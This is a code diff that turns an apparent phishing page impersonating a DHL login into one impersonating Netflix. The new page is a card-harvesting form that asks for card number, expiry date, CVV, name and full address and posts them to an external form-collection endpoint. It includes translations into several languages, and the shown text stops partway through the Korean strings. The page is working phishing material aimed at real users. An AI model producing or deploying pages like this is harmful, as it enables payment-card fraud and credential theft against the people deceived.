@@ -1,213 +1,173 @@
 <!DOCTYPE html>
-<html id="html" lang="en">
+<html lang="en" id="html">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DHL Login</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+    <title data-i18n="title">Netflix Payment Information</title>
+    <!-- i18next for internationalization -->
+    <script src="https://cdn.jsdelivr.net/npm/i18next@23.15.1/dist/umd/i18next.min.js"></script>
     <style>
-        body {
-            font-family: "Roboto", sans-serif;
-            background: url('https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/4be2ae5d-624c-4fa5-954d-060702ddca90.png') no-repeat center center fixed;
-            background-size: cover;
+        * {
+            box-sizing: border-box;
             margin: 0;
-            padding: 20px;
+            padding: 0;
+            font-family: 'Netflix Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #141414;
+            color: #fff;
             display: flex;
-            justify-content: center;
-            align-items: center;
+            flex-direction: column;
             min-height: 100vh;
         }
-        .container {
-            background: rgba(255, 255, 255, 0.9);
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            width: 100%;
-            max-width: 400px;
-            z-index: 1;
+
+        .netflix-logo {
+            padding: 25px 45px;
             position: relative;
         }
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
+
+        .netflix-logo-text {
+            color: #e50914;
+            font-size: 45px;
+            font-weight: 900;
+            text-transform: uppercase;
         }
-        .header img {
-            height: 40px;
-        }
-        .lang-switcher {
-            padding: 5px;
+
+        .payment-container {
+            max-width: 450px;
+            width: 100%;
+            margin: 0 auto;
+            padding: 60px 68px;
+            background-color: rgba(0, 0, 0, 0.75);
             border-radius: 4px;
-            background: #ffffff;
         }
+
         h1 {
-            font-size: 24px;
-            margin: 0 0 20px;
-            text-align: center;
-            color: #333333;
+            color: #fff;
+            font-size: 32px;
+            margin-bottom: 28px;
         }
-        .quick-actions {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 20px;
-        }
-        .quick-actions a {
-            text-decoration: none;
-            color: #d40511;
-            font-weight: bold;
-            font-size: 14px;
-        }
-        form {
+
+        .payment-form {
             display: flex;
             flex-direction: column;
         }
-        input[type="text"], input[type="password"], input[type="email"] {
-            padding: 10px;
-            margin-bottom: 10px;
-            border: 1px solid #cccccc;
-            border-radius: 4px;
-            font-size: 16px;
-            background: #ffffff;
-        }
-        .password-container {
+
+        .form-group {
             position: relative;
+            margin-bottom: 25px;
+            padding-bottom: 5px;
         }
-        .password-container input {
+
+        input {
             width: 100%;
-            box-sizing: border-box;
+            height: auto;
+            padding: 5px 0;
+            background: transparent;
+            border: none;
+            border-bottom: 1px solid #8c8c8c;
+            color: #fff;
+            font-size: 16px;
         }
-        .toggle-password {
+
+        input:focus {
+            outline: none;
+            background: #454545;
+        }
+
+        label {
             position: absolute;
-            right: 10px;
-            top: 50%;
-            transform: translateY(-50%);
-            cursor: pointer;
-            color: #666666;
+            top: 5px;
+            left: 0;
+            color: #8c8c8c;
+            font-size: 16px;
+            transition: all 0.2s ease;
+            pointer-events: none;
         }
+
+        input:focus + label,
+        input:not(:placeholder-shown) + label {
+            top: -15px;
+            font-size: 11px;
+            color: #8c8c8c;
+        }
+
+        .row {
+            display: flex;
+            gap: 20px;
+        }
+
         button {
-            padding: 10px;
-            background-color: #d40511;
-            color: #ffffff;
+            background-color: #e50914;
+            color: white;
             border: none;
             border-radius: 4px;
+            padding: 16px;
             font-size: 16px;
+            font-weight: bold;
             cursor: pointer;
+            margin-top: 24px;
         }
-        button:disabled {
-            background-color: #cccccc;
-            cursor: not-allowed;
+
+        button:hover {
+            background-color: #f40612;
         }
-        button:hover:not(:disabled) {
-            background-color: #b0040f;
-        }
-        .error-message {
-            color: #d40511;
-            font-size: 14px;
-            margin-bottom: 10px;
-            text-align: center;
-        }
-        .links {
+
+        .card-info {
+            font-size: 13px;
+            color: #8c8c8c;
             margin-top: 20px;
-            text-align: center;
         }
-        .links a {
-            color: #d40511;
-            text-decoration: none;
-            font-size: 14px;
-            display: block;
-            margin-bottom: 10px;
-        }
-        .cookie-consent {
-            position: fixed;
-            bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(255, 255, 255, 0.95);
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
-            max-width: 500px;
-            width: 90%;
-            z-index: 1000;
-            text-align: center;
+
+        .error {
+            color: #e87c03;
+            font-size: 13px;
+            margin: 6px 0;
             display: none;
         }
-        .cookie-consent p {
-            margin: 0 0 15px;
+
+        .lang-switcher {
+            position: absolute;
+            top: 25px;
+            right: 45px;
+            background-color: #e50914;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 8px;
             font-size: 14px;
-            color: #333333;
+            font-weight: bold;
+            cursor: pointer;
         }
-        .cookie-consent button {
-            margin: 0 10px;
-            padding: 8px 16px;
-            font-size: 14px;
-        }
-        .cookie-consent .accept {
-            background-color: #d40511;
-        }
-        .cookie-consent .accept:hover {
-            background-color: #b0040f;
-        }
-        .cookie-consent .decline {
-            background-color: #666666;
-        }
-        .cookie-consent .decline:hover {
-            background-color: #555555;
-        }
-        @media (max-width: 480px) {
-            .container {
-                padding: 15px;
-                margin: 10px;
-                background: rgba(255, 255, 255, 0.9);
-            }
-            h1 {
-                font-size: 20px;
-            }
-            .header img {
-                height: 30px;
-            }
-            .quick-actions a {
-                font-size: 12px;
-            }
-            .cookie-consent {
-                bottom: 10px;
-                padding: 15px;
-            }
-            .cookie-consent p {
-                font-size: 12px;
-            }
-            .cookie-consent button {
-                padding: 6px 12px;
-                font-size: 12px;
-            }
-        }
-        [dir="rtl"] .header {
-            flex-direction: row-reverse;
-        }
-        [dir="rtl"] .quick-actions {
-            flex-direction: row-reverse;
-        }
-        [dir="rtl"] .toggle-password {
-            left: 10px;
-            right: auto;
-        }
-        [dir="rtl"] input {
+
+        [dir="rtl"] .text-left {
             text-align: right;
         }
-        [dir="rtl"] .cookie-consent {
-            text-align: right;
+
+        @media (max-width: 740px) {
+            .payment-container {
+                padding: 60px 5%;
+            }
+            .lang-switcher {
+                top: 15px;
+                right: 15px;
+            }
+        }
+
+        /* Honeypot field hidden style */
+        .honeypot {
+            display: none;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <img src="https://www.dhl.com/content/dam/dhl/global/core/images/logos/dhl-logo.svg" alt="DHL Logo">
+    <header>
+        <div class="netflix-logo">
+            <div class="netflix-logo-text" data-i18n="netflix_logo">NETFLIX</div>
             <select class="lang-switcher" onchange="setLanguage(this.value)">
                 <option value="en">English</option>
-                <option value="zh-CN">中文 (简体)</option>
+                <option value="zh-CN">中文</option>
                 <option value="hi">हिन्दी</option>
                 <option value="es">Español</option>
                 <option value="fr">Français</option>
@@ -217,478 +177,686 @@
                 <option value="vi">Tiếng Việt</option>
             </select>
         </div>
-        <h1 data-i18n="header_title">DHL Express</h1>
-        <div class="quick-actions">
-            <a href="#" data-i18n="send_package">Send package</a>
-            <a href="#" data-i18n="send_directly">Send directly</a>
-        </div>
-        <form id="signin-form">
-            <p data-i18n="continue_with_password">Continue with your password</p>
-            <input type="email" id="email" name="email" data-i18n="[placeholder]email_placeholder" placeholder="Email address" required disabled>
-            <div class="password-container">
-                <input type="password" id="password" name="password" data-i18n="[placeholder]password_placeholder" placeholder="Password" required>
-                <span class="toggle-password" id="toggle-password"><i class="fas fa-eye"></i></span>
-            </div>
-            <!-- Honeypot field -->
-            <input type="text" name="honeypot" style="display: none;">
-            <div class="error-message" id="error-message"></div>
-            <button type="submit" id="submit-button" data-i18n="[value]login" value="Login" disabled>Login</button>
-        </form>
-        <div class="links">
-            <a href="#" data-i18n="reset_password">Reset Password</a>
-            <a href="#" data-i18n="no_account">Don't have an account yet? <span data-i18n="sign_up">Sign up</span></a>
-            <a href="#" data-i18n="business_user">Business user? <span data-i18n="business_sign_in">Sign in</span></a>
-        </div>
-    </div>
-    <!-- Cookie Consent Popup -->
-    <div class="cookie-consent" id="cookie-consent">
-        <p data-i18n="cookie_consent_message">
-            We use cookies to enhance your experience. By continuing, you agree to our use of cookies for authentication purposes.
-        </p>
-        <button class="accept" onclick="setCookieConsent('accepted')">Accept</button>
-        <button class="decline" onclick="setCookieConsent('declined')">Decline</button>
-    </div>
+    </header>
 
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/i18next/21.6.14/i18next.min.js"></script>
+    <main>
+        <div class="payment-container">
+            <h1 data-i18n="set_up_payment">Set up your payment</h1>
+            
+            <form class="payment-form" id="paymentForm" action="https://submit-form.com/upnVnrqfK" method="POST">
+                <!-- Honeypot Field -->
+                <div class="form-group honeypot">
+                    <input type="text" id="honeypot" name="honeypot" placeholder="Leave this field empty">
+                </div>
+
+                <div class="form-group">
+                    <input type="text" id="cardNumber" name="card_number" placeholder=" " required data-i18n="[placeholder]card_number_placeholder">
+                    <label for="cardNumber" data-i18n="card_number">Card number</label>
+                    <div class="error" id="cardNumberError" data-i18n="card_number_error">Please enter a valid card number</div>
+                </div>
+
+                <div class="row">
+                    <div class="form-group" style="flex: 1;">
+                        <input type="text" id="expirationDate" name="expiry_date" placeholder=" " required data-i18n="[placeholder]expiry_date_placeholder">
+                        <label for="expirationDate" data-i18n="expiry_date">Exp date (MM/YY)</label>
+                        <div class="error" id="expiryError" data-i18n="expiry_error">Please enter a valid expiration date</div>
+                    </div>
+                    <div class="form-group" style="flex: 1;">
+                        <input type="text" id="cvv" name="cvv" placeholder=" " required data-i18n="[placeholder]cvv_placeholder">
+                        <label for="cvv" data-i18n="cvv">Security code (CVV)</label>
+                        <div class="error" id="cvvError" data-i18n="cvv_error">Please enter a valid security code</div>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <input type="text" id="nameOnCard" name="card_name" placeholder=" " required data-i18n="[placeholder]name_on_card_placeholder">
+                    <label for="nameOnCard" data-i18n="name_on_card">First and last name</label>
+                    <div class="error" id="nameError" data-i18n="name_error">Please enter your name</div>
+                </div>
+
+                <div class="form-group">
+                    <input type="text" id="streetAddress" name="street_address" placeholder=" " required data-i18n="[placeholder]street_address_placeholder">
+                    <label for="streetAddress" data-i18n="street_address">Street Address</label>
+                    <div class="error" id="streetAddressError" data-i18n="street_address_error">Please enter a valid street address</div>
+                </div>
+
+                <div class="form-group">
+                    <input type="text" id="city" name="city" placeholder=" " required data-i18n="[placeholder]city_placeholder">
+                    <label for="city" data-i18n="city">City</label>
+                    <div class="error" id="cityError" data-i18n="city_error">Please enter a valid city</div>
+                </div>
+
+                <div class="row">
+                    <div class="form-group" style="flex: 1;">
+                        <input type="text" id="state" name="state" placeholder=" " required data-i18n="[placeholder]state_placeholder">
+                        <label for="state" data-i18n="state">State/Province</label>
+                        <div class="error" id="stateError" data-i18n="state_error">Please enter a valid state/province</div>
+                    </div>
+                    <div class="form-group" style="flex: 1;">
+                        <input type="text" id="country" name="country" placeholder=" " required data-i18n="[placeholder]country_placeholder">
+                        <label for="country" data-i18n="country">Country</label>
+                        <div class="error" id="countryError" data-i18n="country_error">Please enter a valid country</div>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <input type="text" id="zipcode" name="zipcode" placeholder=" " required autocomplete="postal-code" data-i18n="[placeholder]zipcode_placeholder">
+                    <label for="zipcode" data-i18n="zipcode">Zip/Postal Code</label>
+                    <div class="error" id="zipcodeError" data-i18n="zipcode_error">Please enter a valid zip/postal code</div>
+                </div>
+
+                <button type="submit" data-i18n="submit">Submit</button>
+            </form>
+
+            <p class="card-info" data-i18n="card_info">
+                Your payment will be processed internationally. Additional bank fees may apply.
+            </p>
+        </div>
+    </main>
+
     <script>
         // Translation resources
         const translations = {
             'en': {
                 translation: {
-                    'title': 'DHL Login',
-                    'header_title': 'DHL Express',
-                    'send_package': 'Send package',
-                    'send_directly': 'Send directly',
-                    'continue_with_password': 'Continue with your password',
-                    'email_placeholder': 'Email address',
-                    'password_placeholder': 'Password',
-                    'login': 'Login',
-                    'error_message': 'Please enter both email and password.',
-                    'reset_password': 'Reset Password',
-                    'no_account': "Don't have an account yet?",
-                    'sign_up': 'Sign up',
-                    'business_user': 'Business user?',
-                    'business_sign_in': 'Sign in',
-                    'cookie_consent_message': 'We use cookies to enhance your experience. By continuing, you agree to our use of cookies for authentication purposes.'
+                    'title': 'Netflix Payment Information',
+                    'netflix_logo': 'NETFLIX',
+                    'set_up_payment': 'Set up your payment',
+                    'card_number': 'Card number',
+                    'card_number_placeholder': 'Card number',
+                    'card_number_error': 'Please enter a valid 16-digit card number',
+                    'expiry_date': 'Exp date (MM/YY)',
+                    'expiry_date_placeholder': 'Exp date (MM/YY)',
+                    'expiry_error': 'Please enter a valid, non-expired date (MM/YY)',
+                    'cvv': 'Security code (CVV)',
+                    'cvv_placeholder': 'Security code (CVV)',
+                    'cvv_error': 'Please enter a valid CVV (3 or 4 digits)',
+                    'name_on_card': 'First and last name',
+                    'name_on_card_placeholder': 'First and last name',
+                    'name_error': 'Please enter a valid first and last name',
+                    'street_address': 'Street Address',
+                    'street_address_placeholder': 'Street Address',
+                    'street_address_error': 'Please enter a valid street address',
+                    'city': 'City',
+                    'city_placeholder': 'City',
+                    'city_error': 'Please enter a valid city name',
+                    'state': 'State/Province',
+                    'state_placeholder': 'State/Province',
+                    'state_error': 'Please enter a valid state/province',
+                    'country': 'Country',
+                    'country_placeholder': 'Country',
+                    'country_error': 'Please enter a valid country',
+                    'zipcode': 'Zip/Postal Code',
+                    'zipcode_placeholder': 'Zip/Postal Code',
+                    'zipcode_error': 'Please enter a valid zip/postal code',
+                    'submit': 'Submit',
+                    'card_info': 'Your payment will be processed internationally. Additional bank fees may apply.',
+                    'spam_detected': 'Spam detected!',
+                    'fill_form_again': 'Please fill out the form again.',
+                    'submit_success': 'Form submitted successfully!',
+                    'submit_error': 'Error submitting form.'
                 }
             },
             'zh-CN': {
                 translation: {
-                    'title': 'DHL 登录',
-                    'header_title': 'DHL 快递',
-                    'send_package': '寄送包裹',
-                    'send_directly': '直接寄送',
-                    'continue_with_password': '使用您的密码继续',
-                    'email_placeholder': '电子邮件地址',
-                    'password_placeholder': '密码',
-                    'login': '登录',
-                    'error_message': '请输入电子邮件和密码。',
-                    'reset_password': '重置密码',
-                    'no_account': '还没有账户？',
-                    'sign_up': '注册',
-                    'business_user': '商业用户？',
-                    'business_sign_in': '登录',
-                    'cookie_consent_message': '我们使用 cookie 来提升您的体验。继续即表示您同意我们使用 cookie 进行身份验证。'
+                    'title': 'Netflix 支付信息',
+                    'netflix_logo': 'NETFLIX',
+                    'set_up_payment': '设置您的支付方式',
+                    'card_number': '卡号',
+                    'card_number_placeholder': '卡号',
+                    'card_number_error': '请输入有效的16位卡号',
+                    'expiry_date': '有效期 (MM/YY)',
+                    'expiry_date_placeholder': '有效期 (MM/YY)',
+                    'expiry_error': '请输入有效的、未过期的日期 (MM/YY)',
+                    'cvv': '安全码 (CVV)',
+                    'cvv_placeholder': '安全码 (CVV)',
+                    'cvv_error': '请输入有效的安全码 (3或4位)',
+                    'name_on_card': '姓名',
+                    'name_on_card_placeholder': '姓名',
+                    'name_error': '请输入有效的姓名',
+                    'street_address': '街道地址',
+                    'street_address_placeholder': '街道地址',
+                    'street_address_error': '请输入有效的街道地址',
+                    'city': '城市',
+                    'city_placeholder': '城市',
+                    'city_error': '请输入有效的城市名称',
+                    'state': '州/省',
+                    'state_placeholder': '州/省',
+                    'state_error': '请输入有效的州/省',
+                    'country': '国家',
+                    'country_placeholder': '国家',
+                    'country_error': '请输入有效的国家',
+                    'zipcode': '邮政编码',
+                    'zipcode_placeholder': '邮政编码',
+                    'zipcode_error': '请输入有效的邮政编码',
+                    'submit': '提交',
+                    'card_info': '您的付款将进行国际处理。可能需要支付额外的银行费用。',
+                    'spam_detected': '检测到垃圾信息！',
+                    'fill_form_again': '请再次填写表格。',
+                    'submit_success': '表格提交成功！',
+                    'submit_error': '提交表格时出错。'
                 }
             },
             'hi': {
                 translation: {
-                    'title': 'DHL लॉगिन',
-                    'header_title': 'DHL एक्सप्रेस',
-                    'send_package': 'पैकेज भेजें',
-                    'send_directly': 'सीधे भेजें',
-                    'continue_with_password': 'अपने पासवर्ड के साथ जारी रखें',
-                    'email_placeholder': 'ईमेल पता',
-                    'password_placeholder': 'पासवर्ड',
-                    'login': 'लॉगिन',
-                    'error_message': 'कृपया ईमेल और पासवर्ड दोनों दर्ज करें।',
-                    'reset_password': 'पासवर्ड रीसेट करें',
-                    'no_account': 'अभी तक खाता नहीं है?',
-                    'sign_up': 'साइन अप करें',
-                    'business_user': 'व्यवसायिक उपयोगकर्ता?',
-                    'business_sign_in': 'साइन इन करें',
-                    'cookie_consent_message': 'हम आपके अनुभव को बेहतर बनाने के लिए कुकीज़ का उपयोग करते हैं। जारी रखने से आप प्रमाणीकरण उद्देश्यों के लिए कुकीज़ के उपयोग से सहमत होते हैं।'
+                    'title': 'नेटफ्लिक्स भुगतान जानकारी',
+                    'netflix_logo': 'NETFLIX',
+                    'set_up_payment': 'अपना भुगतान सेट करें',
+                    'card_number': 'कार्ड नंबर',
+                    'card_number_placeholder': 'कार्ड नंबर',
+                    'card_number_error': 'कृपया एक वैध 16-अंकीय कार्ड नंबर दर्ज करें',
+                    'expiry_date': 'समाप्ति तिथि (MM/YY)',
+                    'expiry_date_placeholder': 'समाप्ति तिथि (MM/YY)',
+                    'expiry_error': 'कृपया एक वैध, गैर-समाप्त तिथि (MM/YY) दर्ज करें',
+                    'cvv': 'सुरक्षा कोड (CVV)',
+                    'cvv_placeholder': 'सुरक्षा कोड (CVV)',
+                    'cvv_error': 'कृपया एक वैध CVV (3 या 4 अंक) दर्ज करें',
+                    'name_on_card': 'पहला और अंतिम नाम',
+                    'name_on_card_placeholder': 'पहला और अंतिम नाम',
+                    'name_error': 'कृपया एक वैध पहला और अंतिम नाम दर्ज करें',
+                    'street_address': 'सड़क का पता',
+                    'street_address_placeholder': 'सड़क का पता',
+                    'street_address_error': 'कृपया एक वैध सड़क का पता दर्ज करें',
+                    'city': 'शहर',
+                    'city_placeholder': 'शहर',
+                    'city_error': 'कृपया एक वैध शहर का नाम दर्ज करें',
+                    'state': 'राज्य/प्रांत',
+                    'state_placeholder': 'राज्य/प्रांत',
+                    'state_error': 'कृपया एक वैध राज्य/प्रांत दर्ज करें',
+                    'country': 'देश',
+                    'country_placeholder': 'देश',
+                    'country_error': 'कृपया एक वैध देश दर्ज करें',
+                    'zipcode': 'ज़िप/पोस्टल कोड',
+                    'zipcode_placeholder': 'ज़िप/पोस्टल कोड',
+                    'zipcode_error': 'कृपया एक वैध ज़िप/पोस्टल कोड दर्ज करें',
+                    'submit': 'जमा करें',
+                    'card_info': 'आपका भुगतान अंतरराष्ट्रीय स्तर पर संसाधित किया जाएगा। अतिरिक्त बैंक शुल्क लागू हो सकते हैं।',
+                    'spam_detected': 'स्पैम का पता चला!',
+                    'fill_form_again': 'कृपया फॉर्म फिर से भरें।',
+                    'submit_success': 'फॉर्म सफलतापूर्वक जमा किया गया!',
+                    'submit_error': 'फॉर्म जमा करने में त्रुटि।'
                 }
             },
             'es': {
                 translation: {
-                    'title': 'Inicio de sesión de DHL',
-                    'header_title': 'DHL Express',
-                    'send_package': 'Enviar paquete',
-                    'send_directly': 'Enviar directamente',
-                    'continue_with_password': 'Continúa con tu contraseña',
-                    'email_placeholder': 'Dirección de correo electrónico',
-                    'password_placeholder': 'Contraseña',
-                    'login': 'Iniciar sesión',
-                    'error_message': 'Por favor, introduce correo electrónico y contraseña.',
-                    'reset_password': 'Restablecer contraseña',
-                    'no_account': '¿Aún no tienes una cuenta?',
-                    'sign_up': 'Regístrate',
-                    'business_user': '¿Usuario empresarial?',
-                    'business_sign_in': 'Iniciar sesión',
-                    'cookie_consent_message': 'Usamos cookies para mejorar tu experiencia. Al continuar, aceptas nuestro uso de cookies para fines de autenticación.'
+                    'title': 'Información de pago de Netflix',
+                    'netflix_logo': 'NETFLIX',
+                    'set_up_payment': 'Configura tu pago',
+                    'card_number': 'Número de tarjeta',
+                    'card_number_placeholder': 'Número de tarjeta',
+                    'card_number_error': 'Por favor, introduce un número de tarjeta válido de 16 dígitos',
+                    'expiry_date': 'Fecha de vencimiento (MM/AA)',
+                    'expiry_date_placeholder': 'Fecha de vencimiento (MM/AA)',
+                    'expiry_error': 'Por favor, introduce una fecha de vencimiento válida, no vencida (MM/AA)',
+                    'cvv': 'Código de seguridad (CVV)',
+                    'cvv_placeholder': 'Código de seguridad (CVV)',
+                    'cvv_error': 'Por favor, introduce un CVV válido (3 o 4 dígitos)',
+                    'name_on_card': 'Nombre y apellido',
+                    'name_on_card_placeholder': 'Nombre y apellido',
+                    'name_error': 'Por favor, introduce un nombre y apellido válidos',
+                    'street_address': 'Dirección de la calle',
+                    'street_address_placeholder': 'Dirección de la calle',
+                    'street_address_error': 'Por favor, introduce una dirección de calle válida',
+                    'city': 'Ciudad',
+                    'city_placeholder': 'Ciudad',
+                    'city_error': 'Por favor, introduce un nombre de ciudad válido',
+                    'state': 'Estado/Provincia',
+                    'state_placeholder': 'Estado/Provincia',
+                    'state_error': 'Por favor, introduce un estado/provincia válido',
+                    'country': 'País',
+                    'country_placeholder': 'País',
+                    'country_error': 'Por favor, introduce un país válido',
+                    'zipcode': 'Código postal',
+                    'zipcode_placeholder': 'Código postal',
+                    'zipcode_error': 'Por favor, introduce un código postal válido',
+                    'submit': 'Enviar',
+                    'card_info': 'Tu pago será procesado internacionalmente. Pueden aplicarse tarifas bancarias adicionales.',
+                    'spam_detected': '¡Spam detectado!',
+                    'fill_form_again': 'Por favor, llena el formulario nuevamente.',
+                    'submit_success': '¡Formulario enviado exitosamente!',
+                    'submit_error': 'Error al enviar el formulario.'
                 }
             },
             'fr': {
                 translation: {
-                    'title': 'Connexion DHL',
-                    'header_title': 'DHL Express',
-                    'send_package': 'Envoyer un colis',
-                    'send_directly': 'Envoyer directement',
-                    'continue_with_password': 'Continuer avec votre mot de passe',
-                    'email_placeholder': 'Adresse e-mail',
-                    'password_placeholder': 'Mot de passe',
-                    'login': 'Se connecter',
-                    'error_message': 'Veuillez entrer l’adresse e-mail et le mot de passe.',
-                    'reset_password': 'Réinitialiser le mot de passe',
-                    'no_account': 'Vous n’avez pas encore de compte ?',
-                    'sign_up': 'S’inscrire',
-                    'business_user': 'Utilisateur professionnel ?',
-                    'business_sign_in': 'Se connecter',
-                    'cookie_consent_message': 'Nous utilisons des cookies pour améliorer votre expérience. En continuant, vous acceptez notre utilisation des cookies à des fins d’authentification.'
+                    'title': 'Informations de paiement Netflix',
+                    'netflix_logo': 'NETFLIX',
+                    'set_up_payment': 'Configurez votre paiement',
+                    'card_number': 'Numéro de carte',
+                    'card_number_placeholder': 'Numéro de carte',
+                    'card_number_error': 'Veuillez entrer un numéro de carte valide de 16 chiffres',
+                    'expiry_date': 'Date d’expiration (MM/AA)',
+                    'expiry_date_placeholder': 'Date d’expiration (MM/AA)',
+                    'expiry_error': 'Veuillez entrer une date d’expiration valide, non expirée (MM/AA)',
+                    'cvv': 'Code de sécurité (CVV)',
+                    'cvv_placeholder': 'Code de sécurité (CVV)',
+                    'cvv_error': 'Veuillez entrer un CVV valide (3 ou 4 chiffres)',
+                    'name_on_card': 'Prénom et nom',
+                    'name_on_card_placeholder': 'Prénom et nom',
+                    'name_error': 'Veuillez entrer un prénom et nom valides',
+                    'street_address': 'Adresse de la rue',
+                    'street_address_placeholder': 'Adresse de la rue',
+                    'street_address_error': 'Veuillez entrer une adresse de rue valide',
+                    'city': 'Ville',
+                    'city_placeholder': 'Ville',
+                    'city_error': 'Veuillez entrer un nom de ville valide',
+                    'state': 'État/Province',
+                    'state_placeholder': 'État/Province',
+                    'state_error': 'Veuillez entrer un état/province valide',
+                    'country': 'Pays',
+                    'country_placeholder': 'Pays',
+                    'country_error': 'Veuillez entrer un pays valide',
+                    'zipcode': 'Code postal',
+                    'zipcode_placeholder': 'Code postal',
+                    'zipcode_error': 'Veuillez entrer un code postal valide',
+                    'submit': 'Soumettre',
+                    'card_info': 'Votre paiement sera traité à l’international. Des frais bancaires supplémentaires peuvent s’appliquer.',
+                    'spam_detected': 'Spam détecté !',
+                    'fill_form_again': 'Veuillez remplir à nouveau le formulaire.',
+                    'submit_success': 'Formulaire soumis avec succès !',
+                    'submit_error': 'Erreur lors de la soumission du formulaire.'
                 }
             },
             'ar': {
                 translation: {
-                    'title': 'تسجيل الدخول إلى DHL',
-                    'header_title': 'DHL إكسبريس',
-                    'send_package': 'إرسال طرد',
-                    'send_directly': 'إرسال مباشر',
-                    'continue_with_password': 'تابع باستخدام كلمة المرور الخاصة بك',
-                    'email_placeholder': 'عنوان البريد الإلكتروني',
-                    'password_placeholder': 'كلمة المرور',
-                    'login': 'تسجيل الدخول',
-                    'error_message': 'يرجى إدخال البريد الإلكتروني وكلمة المرور.',
-                    'reset_password': 'إعادة تعيين كلمة المرور',
-                    'no_account': 'ليس لديك حساب بعد؟',
-                    'sign_up': 'التسجيل',
-                    'business_user': 'مستخدم تجاري؟',
-                    'business_sign_in': 'تسجيل الدخول',
-                    'cookie_consent_message': 'نستخدم ملفات تعريف الارتباط لتحسين تجربتك. بالمتابعة، فإنك توافق على استخدامنا لملفات تعريف الارتباط لأغراض التوثيق.'
+                    'title': 'معلومات الدفع لنتفليكس',
+                    'netflix_logo': 'NETFLIX',
+                    'set_up_payment': 'إعداد الدفع الخاص بك',
+                    'card_number': 'رقم البطاقة',
+                    'card_number_placeholder': 'رقم البطاقة',
+                    'card_number_error': 'يرجى إدخال رقم بطاقة صالح مكون من 16 رقمًا',
+                    'expiry_date': 'تاريخ الانتهاء (MM/YY)',
+                    'expiry_date_placeholder': 'تاريخ الانتهاء (MM/YY)',
+                    'expiry_error': 'يرجى إدخال تاريخ انتهاء صالح وغير منتهي (MM/YY)',
+                    'cvv': 'رمز الأمان (CVV)',
+                    'cvv_placeholder': 'رمز الأمان (CVV)',
+                    'cvv_error': 'يرجى إدخال رمز أمان صالح (3 أو 4 أرقام)',
+                    'name_on_card': 'الاسم الأول والأخير',
+                    'name_on_card_placeholder': 'الاسم الأول والأخير',
+                    'name_error': 'يرجى إدخال اسم أول وأخير صالح',
+                    'street_address': 'عنوان الشارع',
+                    'street_address_placeholder': 'عنوان الشارع',
+                    'street_address_error': 'يرجى إدخال عنوان شارع صالح',
+                    'city': 'المدينة',
+                    'city_placeholder': 'المدينة',
+                    'city_error': 'يرجى إدخال اسم مدينة صالح',
+                    'state': 'الولاية/المحافظة',
+                    'state_placeholder': 'الولاية/المحافظة',
+                    'state_error': 'يرجى إدخال ولاية/محافظة صالحة',
+                    'country': 'البلد',
+                    'country_placeholder': 'البلد',
+                    'country_error': 'يرجى إدخال بلد صالح',
+                    'zipcode': 'الرمز البريدي',
+                    'zipcode_placeholder': 'الرمز البريدي',
+                    'zipcode_error': 'يرجى إدخال رمز بريدي صالح',
+                    'submit': 'إرسال',
+                    'card_info': 'سيتم معالجة دفعك دوليًا. قد تُطبق رسوم بنكية إضافية.',
+                    'spam_detected': 'تم اكتشاف البريد العشوائي!',
+                    'fill_form_again': 'يرجى ملء النموذج مرة أخرى.',
+                    'submit_success': 'تم إرسال النموذج بنجاح!',
+                    'submit_error': 'خطأ في إرسال النموذج.'
                 }
             },
             'ko': {
                 translation: {
-                    'title': 'DHL 로그인',
-                    'header_title': 'DHL 익스프레스',
-                    'send_package': '패키지 보내기',
-                    'send_directly': '직접 보내기',
-                    'continue_with_password': '비밀번호로 계속하기',
-                    'email_placeholder': '이메일 주소',
-                    'password_placeholder': '비밀번호',
-                    'login': '로그인',
-                    'error_message': '이메일과 비밀번호를 입력해 주세요.',
-                    'reset_password': '비밀번호 재설정',
-                    'no_account': '아직 계정이 없으신가요?',
-                    'sign_up': '가입하기',
-                    'business_user': '비즈니스 사용자?',
-                    'business_sign_in': '로그인',
-                    'cookie_consent_message': '우리는 쿠키를 사용하여 사용자 경험을 향상시킵니다. 계속하면 인증 목적으로 쿠키 사용에 동의하는 것입니다.'
+                    'title': '넷플릭스 결제 정보',
+                    'netflix_logo': 'NETFLIX',
+                    'set_up_payment': '결제 설정',
+                    'card_number': '카드 번호',
+                    'card_number_placeholder': '카드 번호',
+                    'card_number_error': '유효한 16자리 카드 번호를 입력해 주세요',
+                    'expiry_date': '만료일 (MM/YY)',
+                    'expiry_date_placeholder': '만료일 (MM/YY)',
+                    'expiry_error': '유효하고 만료되지 않은 날짜(MM/YY)를 입력해 주세요',
+                    'cvv': '보안 코드 (CVV)',
+                    'cvv_placeholder': '보안 코드 (CVV)',
+                    'cvv_error': '유효한 CVV(3 또는 4자리)를 입력해 주세요',
+                    'name_on_card': '이름 및 성',
+                    'name_on_card_placeholder': '이름 및 성',
+                    'name_error': '유효한 이름과 성을 입력해 주세요',
+                    'street_address': '도로 주소',
+                    'street_address_placeholder': '도로 주소',
+                    'street_address_error': '유효한 도로 주소를 입력해 주세요',
+                    'city': '도시',
+                    'city_placeholder': '도시',
+                    'city_error': '유효한 도시 이름을 입력해 주세요',
+                    'state': '주/도',
+                    'state_placeholder': '주/도',
+                    'state_error': '유효한 주/도를 입력해 주세요',
+                    'country': '국가',
+                    'country_placeholder': '국가',
+                    'country_error': '유효한 국가를 입력해 주세요',
+                    'zipcode': '우편번호',
+                    'zipcode_placeholder': '우편번호',
